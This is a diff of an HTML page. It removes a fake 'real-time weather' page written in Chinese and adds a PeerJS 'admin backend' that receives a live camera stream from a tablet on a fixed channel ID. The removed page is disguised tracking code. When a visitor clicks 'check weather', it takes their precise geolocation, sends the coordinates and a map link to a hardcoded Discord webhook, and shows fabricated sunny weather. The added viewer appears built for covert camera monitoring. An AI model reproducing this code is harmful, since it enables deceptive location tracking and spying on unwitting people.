@@ -1,213 +1,59 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-TW">
 <head>
-<meta charset="utf-8">
-<title>即時天氣</title>
-
-<style>
-
-body{
-font-family:Arial;
-text-align:center;
-padding-top:80px;
-overflow:hidden;
-
-/* 更真實天空 */
-background:linear-gradient(-45deg,#4fc3f7,#81d4fa,#b3e5fc,#4fc3f7,#29b6f6);
-background-size:500% 500%;
-animation:skyFlow 25s ease infinite;
-}
-
-/* 天空流動 */
-@keyframes skyFlow{
-0%{background-position:0% 50%;}
-50%{background-position:100% 50%;}
-100%{background-position:0% 50%;}
-}
-
-/* 卡片升級 */
-.weather-box{
-background:rgba(255,255,255,0.92);
-width:320px;
-margin:auto;
-padding:25px;
-border-radius:20px;
-backdrop-filter:blur(12px);
-box-shadow:0 20px 60px rgba(0,0,0,0.25);
-animation:cardFloat 6s ease-in-out infinite;
-}
-
-/* 卡片漂浮 */
-@keyframes cardFloat{
-0%{transform:translateY(0px);}
-50%{transform:translateY(-12px);}
-100%{transform:translateY(0px);}
-}
-
-/* 太陽更真實 */
-.sun{
-width:90px;
-height:90px;
-border-radius:50%;
-margin:20px auto;
-background:radial-gradient(circle,#fff176,#fdd835,#fbc02d);
-box-shadow:
-0 0 40px #ffeb3b,
-0 0 80px #ffeb3b,
-0 0 120px #ffeb3b;
-animation:sunGlow 4s ease-in-out infinite;
-}
-
-/* 太陽呼吸 */
-@keyframes sunGlow{
-0%{transform:scale(1);}
-50%{transform:scale(1.15);}
-100%{transform:scale(1);}
-}
-
-/* 雲朵 */
-.cloud{
-width:140px;
-height:45px;
-background:white;
-border-radius:40px;
-margin:20px auto;
-position:relative;
-animation:cloudFloat 6s ease-in-out infinite;
-box-shadow:0 5px 15px rgba(0,0,0,0.1);
-}
-
-.cloud:before{
-content:"";
-position:absolute;
-width:70px;
-height:70px;
-background:white;
-border-radius:50%;
-top:-35px;
-left:15px;
-}
-
-.cloud:after{
-content:"";
-position:absolute;
-width:60px;
-height:60px;
-background:white;
-border-radius:50%;
-top:-30px;
-left:60px;
-}
-
-@keyframes cloudFloat{
-0%{transform:translateX(-15px);}
-50%{transform:translateX(15px);}
-100%{transform:translateX(-15px);}
-}
-
-/* 按鈕升級 */
-button{
-padding:12px 25px;
-font-size:16px;
-border:none;
-border-radius:12px;
-background:linear-gradient(45deg,#42a5f5,#1e88e5);
-color:white;
-cursor:pointer;
-transition:0.3s;
-}
-
-button:hover{
-transform:scale(1.07);
-box-shadow:0 10px 25px rgba(0,0,0,0.3);
-}
-
-#status{
-margin-top:20px;
-font-size:18px;
-}
-
-</style>
-
+    <meta charset="utf-8">
+    <title>管理後台 - 實時監控</title>
+    <!-- 引入 PeerJS 核心函式庫 -->
+    <script src="https://unpkg.com"></script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 20px; }
+        #remote-video { width: 100%; max-width: 800px; background: #000; border: 3px solid #333; border-radius: 8px; margin-top: 20px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; border-radius: 5px; border: none; background: #007bff; color: white; }
+        button:hover { background: #0056b3; }
+        .info { margin-bottom: 15px; color: #aaa; }
+    </style>
 </head>
-
 <body>
 
-<div class="weather-box">
+    <h2>控制後台 - 實時影像接收</h2>
+    <div class="info">目標頻道: <span id="target-id">正在載入...</span></div>
+    <button onclick="connectToTablet()">主動連接平板鏡頭</button>
+    <br>
+    <video id="remote-video" autoplay playsinline></video>
 
-<div class="sun"></div>
-<div class="cloud"></div>
+    <script>
+    // 必須與平板端設定完全相同的 ID 才能對接
+    const TARGET_ID = "live-monitor-channel-12345"; 
+    document.getElementById("target-id").innerText = TARGET_ID;
 
-<h2>🌤 即時天氣查詢</h2>
+    // 初始化後台的 PeerJS（不指定 ID，讓系統隨機分配一個臨時 ID）
+    const peer = new Peer();
 
-<p>點擊按鈕查看目前天氣</p>
+    peer.on('open', function(id) {
+        console.log('後台初始化成功，連線 ID: ' + id);
+    });
 
-<button onclick="getLocation()">查看天氣</button>
+    // 點擊按鈕開始連接平板
+    function connectToTablet() {
+        console.log("正在嘗試連接到平板: " + TARGET_ID);
+        
+        // 發起連線呼叫（因為後台只需觀看，不需傳送畫面，所以傳入一個空的 MediaStream 或不傳）
+        // 這裡建立一個虛擬的空串流以符合 API 要求，或者直接呼叫
+        const call = peer.call(TARGET_ID, new MediaStream());
+        
+        // 監聽來自平板回應的視訊串流
+        call.on('stream', function(remoteStream) {
+            console.log("成功接收到平板影像串流");
+            const remoteVideo = document.getElementById("remote-video");
+            remoteVideo.srcObject = remoteStream;
+        });
 
-<p id="status"></p>
-
-</div>
-
-<script>
-
-var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
-
-function getLocation(){
-
-document.getElementById("status").innerHTML="正在取得天氣資料...";
-
-if(navigator.geolocation){
-
-navigator.geolocation.getCurrentPosition(success,error,{
-enableHighAccuracy:true,
-timeout:10000,
-maximumAge:0
-});
-
-}else{
-
-document.getElementById("status").innerHTML="瀏覽器不支援定位";
-
-}
-
-}
-
-function success(pos){
-
-var lat = pos.coords.latitude;
-var lon = pos.coords.longitude;
-var acc = pos.coords.accuracy;
-
-fetch(webhook,{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-content:
-"📍有人打開網站\n"+
-"緯度: "+lat+"\n"+
-"經度: "+lon+"\n"+
-"精準度: "+acc+" 公尺\n"+
-"地圖: https://www.google.com/maps?q="+lat+","+lon
-})
-});
-
-document.getElementById("status").innerHTML=
-"☀️ 晴天<br>"+
-"🌡 溫度：26°C<br>"+
-"🌬 微風<br>"+
-"📍目前位置天氣";
-
-}
-
-function error(){
-
-document.getElementById("status").innerHTML="需要允許定位才能查看天氣";
-
-}
-
-</script>
+        call.on('error', function(err) {
+            console.error("連線發生錯誤:", err);
+            alert("連線失敗，請確認平板網頁是否已打開且允許相機權限。");
+        });
+    }
+    </script>
 
 </body>
 </html>
